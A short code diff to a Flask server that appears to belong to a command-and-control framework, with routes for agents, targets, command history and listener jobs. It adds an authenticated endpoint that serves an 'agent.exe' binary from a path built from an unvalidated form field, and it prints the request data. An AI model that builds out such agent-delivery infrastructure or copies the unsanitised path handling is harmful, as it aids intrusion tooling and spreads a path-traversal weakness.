@@ -9,7 +9,8 @@ import yaml
 
 from __main__ import app
 from flask import (
-    request
+    request,
+    send_from_directory
 )
 
 from flask_login import (
@@ -60,6 +61,29 @@ def build_config():
     
     with open(config_file, 'r') as stream:
         return yaml.safe_load(stream)
+    
+
+@app.route('/api/v1/build', methods=['POST'])
+@login_required
+def build():
+    """
+    Build an agent and send the binary to the client.
+    post body should have the build parameters and the agent name.
+    """
+    agent = request.form.get("agent")
+    if agent is None:
+        return {'success': False, 'data': "No agent specified"}
+    
+
+    for el in request.form.items():
+        print(el)
+
+    executable = "agent.exe"
+    build_path = CONFIG["agents_path"]
+    agent_dir = os.path.join(build_path, agent)
+
+    print(request.form, agent_dir)
+    return send_from_directory(agent_dir, executable)
 
 
 @app.route('/api/v1/agents_list', methods=["GET"])
@@ -79,7 +103,6 @@ def agents_list():
         agents = [agents[default_index]] + agents[:default_index] + agents[default_index+1:]
 
     return agents
-
 
 
 @app.route('/api/v1/command_history/<target_id>', methods=["GET"])
@@ -163,6 +186,7 @@ def get_target(listener=None):
         if target['uid'] == uid:
             return {'success': True, 'data': target}
     return {'success': False, 'data': "No target with this uid"}
+
 
 @app.route('/api/v1/current_jobs', methods=["GET"])
 @listener_login_required
